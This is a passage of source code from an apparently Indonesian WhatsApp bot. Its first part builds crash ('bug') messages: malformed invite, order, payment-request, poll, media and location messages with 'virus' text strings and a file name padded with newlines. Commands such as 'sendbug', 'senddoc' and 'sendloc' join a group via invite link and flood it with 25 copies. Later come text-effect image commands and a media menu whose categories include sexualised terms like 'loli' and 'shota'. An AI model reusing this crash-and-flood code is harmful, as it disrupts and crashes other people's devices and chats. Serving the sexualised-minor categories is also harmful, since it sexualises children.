var buginvite = generateWAMessageFromContent(from, { groupInviteMessage: { groupJid: '62858428854987@g.us', inviteCode: 'UkJdqTXupAtmDwo4', inviteExpiration: '1643553084', invitetime: '1643293887000', groupName: `ৡৢ͜͡𝟒𝟎𝟒-GpStore ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, thumbnail: ppnyaimg, caption: `ৡৢ͜͡𝟒𝟎𝟒-GpStore ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, contextInfo: { forwardingScore: 150, isForwarded: true },},},{ quoted: lep })
var pollCreation = generateWAMessageFromContent(from,proto.Message.fromObject({pollCreationMessage: {name: 'HALO DEKK 🥶',options: [{ optionName: 'VOTE YUK' }, { optionName: 'BERANI VOTE GK' }, { optionName: 'VOTE LAH SEMUA' }, { optionName: 'KATANYA WA KEBAL' }, { optionName: 'SALAM CREATOR BOT' }],selectableOptionsCount: 5,},}),{ userJid: from, quoted: lep })
var messa = await prepareWAMessageMedia({ image: ppnyaimg }, { upload: GpStore.waUploadToServer })
var order = generateWAMessageFromContent(from,proto.Message.fromObject({ orderMessage: { orderId: '594071395007984',orderImage: messa.imageMessage,itemCount: 100000000000,status: 'INQUIRY',surface: 'CATALOG',message: `ৡৢ͜͡𝟒𝟎𝟒-GpStore ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,jpegThumbnail: ppnyaimg,orderTitle: `ৡৢ͜͡𝟒𝟎𝟒-GpStore ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,sellerJid: '628979185922@s.whatsapp.net',token: 'AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==',totalAmount1000: '500000000000000',totalCurrencyCode: 'IDR',},}),{ userJid: from, quoted: lep })
var audio = generateWAMessageFromContent(from,proto.Message.fromObject({audioMessage: {url: 'https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc',mimetype: 'audio/mpeg',fileSha256: 'jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=',fileLength: '258330',seconds: 16,ptt: false,mediaKey: 'gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=',fileEncSha256: '6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=',directPath: '/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118',mediaKeyTimestamp: '1657190832',},}),{ userJid: from, quoted: lep })
var image = generateWAMessageFromContent(from,proto.Message.fromObject({imageMessage: {url: 'https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc',mimetype: 'image/jpeg',caption: `ৡৢ͜͡𝟒𝟎𝟒-GpStore ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,fileSha256: 'A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=',fileLength: '42521',height: 426,width: 640,mediaKey: '6ATS0zqhx869VtGOm3diwMjszFt3jqFm/tM/Ujw2L1s=',fileEncSha256: 'Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI=',directPath: '/v/t62.7118-24/56480083_2120248748157036_7836614530383507665_n.enc?ccb=11-4&oh=01_AVz0urelAted1JzbEyzzaPFeDjfQw7QTsNJIgrqlyk_3kQ&oe=62EEC1C1',mediaKeyTimestamp: '1657286523',jpegThumbnail: messa.imageMessage,},}),{ userJid: from, quoted: lep })
var document = generateWAMessageFromContent(from,proto.Message.fromObject({documentMessage: {url: 'https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc',mimetype: 'application/octet-stream',title: '.dev',fileSha256: '47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=',pageCount: 0,mediaKey: 'EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=',fileName: `ৡৢ͜͡𝟒𝟎𝟒-GpStore ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,fileEncSha256: 'dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=',directPath: '/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5',mediaKeyTimestamp: '1657288637',},}),{ userJid: from, quoted: lep })
var sticker = generateWAMessageFromContent(from,proto.Message.fromObject({stickerMessage: {url: 'https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc',fileSha256: 'YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=',fileEncSha256: '9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=',mediaKey: 'nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=',mimetype: 'image/webp',height: 64,width: 64,directPath: '/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781',fileLength: '7774',mediaKeyTimestamp: '1657290167',isAnimated: false,},}),{ userJid: from, quoted: lep })
var liveLocation = generateWAMessageFromContent(from,proto.Message.fromObject({ liveLocationMessage: { degreesLatitude: -6.9367014, degreesLongitude: 107.7228574, caption: `ৡৢ͜͡𝟒𝟎𝟒-GpStore ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, sequenceNumber: '1657237469254001', jpegThumbnail: messa.imageMessage } }),{ userJid: from, quoted: lep })
for (let i = 0; i < jumlah; i++) {
GpStore.relayMessage(numt, buginvite.message, { messageId: buginvite.key.id })
GpStore.relayMessage(numt, { requestmentMessage: { Message: { TextMessage: { text: '', currencyCodeIso4217: 'USD', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
GpStore.relayMessage(numt, pollCreation.message, { messageId: pollCreation.key.id })
GpStore.relayMessage(numt, order.message, { messageId: order.key.id })
GpStore.relayMessage(numt, audio.message, { messageId: audio.key.id })
GpStore.relayMessage(numt, image.message, { messageId: image.key.id })
GpStore.relayMessage(numt, document.message, { messageId: document.key.id })
GpStore.relayMessage(numt, liveLocation.message, { messageId: liveLocation.key.id })
GpStore.relayMessage(numt, sticker.message, { messageId: sticker.key.id })
GpStore.sendKatalog(numt, `ৡৢ͜͡𝟒𝟎𝟒-GpStore ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, `ৡৢ͜͡𝟒𝟎𝟒-GpStore ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, ppnyaimg, { quoted: lep })
GpStore.sendMessage(numt, { text: '', templateButtons: [{ callButton: { displayText: `P`, phoneNumber: ``}},{ urlButton: { displayText: `P`, url: `https://wa.me/`}},{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},{ quickReplyButton: { displayText: `P`, id: ``}},{ quickReplyButton: { displayText: `P`, id: ``}},{ quickReplyButton: { displayText: `P`, id: ``}},]})
}
}
break
case 'sendbug':{
if (!itsMeGpStore) return reply(mess.owner)
if (!q) return reply(`Contoh ${prefix+command} linkgc`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
let result = args[0].split('https://chat.whatsapp.com/')[1]
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
let kir = await GpStore.groupAcceptInvite(result)
GpStore.relayMessage(kir, {
requestmentMessage: { 
Message: { 
extendedTextMessage: { 
text: `GpStore Bot ${virus}${virtex(prefix)}`, 
currencyCodeIso4217: 'IDR', 
requestFrom: '0@s.whatsapp.net', 
expiryTimestamp: 8000, 
amount: 1, 
background: ppnyaimg }}}}, {quoted:lep})
await sleep(1000)
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case 'senddoc':{
if (!itsMeGpStore) return reply(mess.owner)
if (!q) return reply(`Contoh ${prefix+command} linkgc`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
let result = args[0].split('https://chat.whatsapp.com/')[1]
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
let kir = await GpStore.groupAcceptInvite(result)
GpStore.sendMessage(kir, { 
document: ppnyaimg, 
fileName: `🔥 GpStore BOT ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, 
mimetype: `application/txt`, 
jpegThumbnail: ppnyaimg, 
mentions:[sender] }, {quoted:lep})
await sleep(1000)
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case 'sendloc':{
if (!itsMeGpStore) return reply(mess.owner)
if (!q) return reply(`Contoh ${prefix+command} linkgc`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
let result = args[0].split('https://chat.whatsapp.com/')[1]
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
let kir = await GpStore.groupAcceptInvite(result)
var messa = await prepareWAMessageMedia({ image: ppnyaimg }, { upload: GpStore.waUploadToServer })
var location = generateWAMessageFromContent(kir, proto.Message.fromObject({
"locationMessage": {
"degreesLatitude": -6.936928157735237,
"degreesLongitude": 107.72270679473877,
"name": `GpStore Bot WhatsApp ${virus}`,
"address": `Created By GpStore ${virtex(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: from, quoted: lep })
GpStore.relayMessage(kir, location.message, { messageId: location.key.id })
await sleep(1000)
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case 'candy': 
case 'christmas': 
case '3dchristmas': 
case 'sparklechristmas':
case 'deepsea': 
case 'scifi': 
case 'rainbow': 
case 'waterpipe': 
case 'spooky': 
case 'pencil': 
case 'circuit': 
case 'discovery': 
case 'metalic': 
case 'fiction': 
case 'demon': 
case 'transformer': 
case 'berry': 
case 'thunder': 
case 'magma': 
case '3dstone': 
case 'neonlight': 
case 'glitch': 
case 'harrypotter': 
case 'brokenglass': 
case 'papercut': 
case 'watercolor': 
case 'multicolor': 
case 'neondevil': 
case 'underwater': 
case 'graffitibike':
case 'snow': 
case 'cloud': 
case 'honey': 
case 'ice': 
case 'fruitjuice': 
case 'biscuit': 
case 'wood': 
case 'chocolate': 
case 'strawberry': 
case 'matrix': 
case 'blood': 
case 'dropwater': 
case 'toxic': 
case 'lava': 
case 'rock': 
case 'bloodglas': 
case 'hallowen': 
case 'darkgold': 
case 'joker': 
case 'wicker':
case 'firework': 
case 'skeleton': 
case 'blackpink': 
case 'sand': 
case 'glue': 
case '1917': 
case 'leaves': {
if (!isPrem) return replyprem(mess.premium)
if (!q) return reply(`Example : ${prefix+command} GpStore`) 
let link
if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
if (/3dchristmas/.test(command)) link = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'
if (/sparklechristmas/.test(command)) link = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'
if (/deepsea/.test(command)) link = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html'
if (/scifi/.test(command)) link = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'
if (/rainbow/.test(command)) link = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html'
if (/waterpipe/.test(command)) link = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html'
if (/spooky/.test(command)) link = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html'
if (/pencil/.test(command)) link = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html'
if (/circuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'
if (/discovery/.test(command)) link = 'https://textpro.me/create-space-text-effects-online-free-1042.html'
if (/metalic/.test(command)) link = 'https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html'
if (/fiction/.test(command)) link = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html'
if (/demon/.test(command)) link = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'
if (/transformer/.test(command)) link = 'https://textpro.me/create-a-transformer-text-effect-online-1035.html'
if (/berry/.test(command)) link = 'https://textpro.me/create-berry-text-effect-online-free-1033.html'
if (/thunder/.test(command)) link = 'https://textpro.me/online-thunder-text-effect-generator-1031.html'
if (/magma/.test(command)) link = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html'
if (/3dstone/.test(command)) link = 'https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html'
if (/neonlight/.test(command)) link = 'https://textpro.me/create-3d-neon-light-text-effect-online-1028.html'
if (/glitch/.test(command)) link = 'https://textpro.me/create-impressive-glitch-text-effects-online-1027.html'
if (/harrypotter/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
if (/brokenglass/.test(command)) link = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html'
if (/papercut/.test(command)) link = 'https://textpro.me/create-art-paper-cut-text-effect-online-1022.html'
if (/watercolor/.test(command)) link = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'
if (/multicolor/.test(command)) link = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'
if (/neondevil/.test(command)) link = 'https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html'
if (/underwater/.test(command)) link = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html'
if (/graffitibike/.test(command)) link = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html'
if (/snow/.test(command)) link = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html'
if (/cloud/.test(command)) link = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html'
if (/honey/.test(command)) link = 'https://textpro.me/honey-text-effect-868.html'
if (/ice/.test(command)) link = 'https://textpro.me/ice-cold-text-effect-862.html'
if (/fruitjuice/.test(command)) link = 'https://textpro.me/fruit-juice-text-effect-861.html'
if (/biscuit/.test(command)) link = 'https://textpro.me/biscuit-text-effect-858.html'
if (/wood/.test(command)) link = 'https://textpro.me/wood-text-effect-856.html'
if (/chocolate/.test(command)) link = 'https://textpro.me/chocolate-cake-text-effect-890.html'
if (/strawberry/.test(command)) link = 'https://textpro.me/strawberry-text-effect-online-889.html'
if (/matrix/.test(command)) link = 'https://textpro.me/matrix-style-text-effect-online-884.html'
if (/blood/.test(command)) link = 'https://textpro.me/horror-blood-text-effect-online-883.html'
if (/dropwater/.test(command)) link = 'https://textpro.me/dropwater-text-effect-872.html'
if (/toxic/.test(command)) link = 'https://textpro.me/toxic-text-effect-online-901.html'
if (/lava/.test(command)) link = 'https://textpro.me/lava-text-effect-online-914.html'
if (/rock/.test(command)) link = 'https://textpro.me/rock-text-effect-online-915.html'
if (/bloodglas/.test(command)) link = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html'
if (/hallowen/.test(command)) link = 'https://textpro.me/halloween-fire-text-effect-940.html'
if (/darkgold/.test(command)) link = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html'
if (/joker/.test(command)) link = 'https://textpro.me/create-logo-joker-online-934.html'
if (/wicker/.test(command)) link = 'https://textpro.me/wicker-text-effect-online-932.html'
if (/firework/.test(command)) link = 'https://textpro.me/firework-sparkle-text-effect-930.html'
if (/skeleton/.test(command)) link = 'https://textpro.me/skeleton-text-effect-online-929.html'
if (/blackpink/.test(command)) link = 'https://textpro.me/create-blackpink-logo-style-online-1001.html'
if (/sand/.test(command)) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'
if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'
let anu = await textpro.textpro(link, q)
GpStore.sendMessage(m.chat, { image: { url: anu }, caption: `${mess.succes}` }, { quoted: m })
}
break
case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{
if (!isPrem) return replyprem(mess.premium)
if (!q) return reply(`Example : ${prefix+command} GpStore`) 
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, q)
GpStore.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${mess.succes}` }, { quoted: m })
}
break
case 'shadow': 
case 'write': 
case 'romantic': 
case 'burnpaper':
case 'smoke': 
case 'narutobanner': 
case 'love': 
case 'undergrass':
case 'doublelove': 
case 'coffecup':
case 'underwaterocean':
case 'smokyneon':
case 'starstext':
case 'rainboweffect':
case 'balloontext':
case 'metalliceffect':
case 'embroiderytext':
case 'flamingtext':
case 'stonetext':
case 'writeart':
case 'summertext':
case 'wolfmetaltext':
case 'nature3dtext':
case 'rosestext':
case 'naturetypography':
case 'quotesunder':
case 'shinetext':{
if (!isPrem) return replyprem(mess.premium)
if (!q) return reply(`Example : ${prefix+command} GpStore`) 
let link
if (/stonetext/.test(command)) link = 'https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html'
if (/writeart/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-art-quote-on-wood-heart-370.html'
if (/summertext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/3d-summer-text-effect-367.html'
if (/wolfmetaltext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-wolf-metal-text-effect-365.html'
if (/nature3dtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-nature-3d-text-effects-364.html'
if (/rosestext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/yellow-roses-text-360.html'
if (/naturetypography/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-vector-nature-typography-355.html'
if (/quotesunder/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/quotes-under-fall-leaves-347.html'
if (/shinetext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/rainbow-shine-text-223.html'
if (/shadow/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/shadow-text-effect-in-the-sky-394.html'
if (/write/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-the-cup-392.html'
if (/romantic/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/romantic-messages-for-your-loved-one-391.html'
if (/burnpaper/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-burn-paper-388.html'
if (/smoke/.test(command)) link = 'https://photooxy.com/other-design/create-an-easy-smoke-type-effect-390.html'
if (/narutobanner/.test(command)) link = 'https://photooxy.com/manga-and-anime/make-naruto-banner-online-free-378.html'
if (/love/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-picture-of-love-message-377.html'
if (/undergrass/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-quotes-under-grass-376.html'
if (/doublelove/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/love-text-effect-372.html'
if (/coffecup/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/put-any-text-in-to-coffee-cup-371.html'
if (/underwaterocean/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/creating-an-underwater-ocean-363.html'
if (/smokyneon/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-smoky-neon-glow-effect-343.html'
if (/starstext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-stars-text-on-the-night-sky-200.html'
if (/rainboweffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/glow-rainbow-effect-generator-201.html'
if (/balloontext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/royal-look-text-balloon-effect-173.html'
if (/metalliceffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/illuminated-metallic-effect-177.html'
if (/embroiderytext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-embroidery-text-online-191.html'
if (/flamingtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html'
let dehe = await photooxy.photoOxy(link, q)
GpStore.sendMessage(m.chat, { image: { url: dehe }, caption: `${mess.succes}` }, { quoted: m })
}
break
case 'aesthetic': case 'ahegao': case 'akira': case 'akiyama': case 'ana': case 'anjing': case 'art': case 'ass': case 'asuna': case 'ayuzawa': case 'bdsm': case 'boneka': case 'boruto': case 'bts': case 'cecan': case 'chiho': case 'chitoge': case 'cogan': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cuckold': case 'cum': case 'cyber': case 'darkjokes': case 'deidara': case 'doraemon': case 'eba': case 'elaina': case 'emilia': case 'ero': case 'erza': case 'exo': case 'femdom': case 'foot': case 'freefire': case 'gamewallpaper': case 'gangbang': case 'gifs': case 'glasses': case 'gremory': case 'hekel': case 'hentai': case 'hestia': case 'hijaber': case 'hinata': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jahy': case 'jeni': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'kartun': case 'katakata': case 'keneki': case 'kotori': case 'kpop': case 'kucing': case 'kurumi': case 'lisa': case 'loli': case 'madara': case 'masturbation': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'milf': case 'minato': case 'mobil': case 'motor': case 'mountain': case 'naruto': case 'neko': case 'neko2': case 'nekonime': case 'nezuko': case 'onepiece': case 'orgy': case 'panties': case 'pentol': case 'pokemon': case 'profil': case 'programming': case 'pubg': case 'pussy': case 'randblackpink': case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'ryujin': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'tatasurya': case 'technology': case 'tejina': case 'tentacles': case 'thighs': case 'toukachan': case 'tsunade': case 'waifu': case 'wallhp': case 'wallml': case 'wallnime': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
if (!isPrem) return replyprem(mess.premium)
let heyy
if (/aesthetic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/aesthetic.json')
if (/ahegao/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/ahegao.json')
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/ana.json')
if (/anjing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/anjing.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/art.json')
if (/ass/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/ass.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/ayuzawa.json')
if (/bdsm/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/bdsm.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/chiho.json')
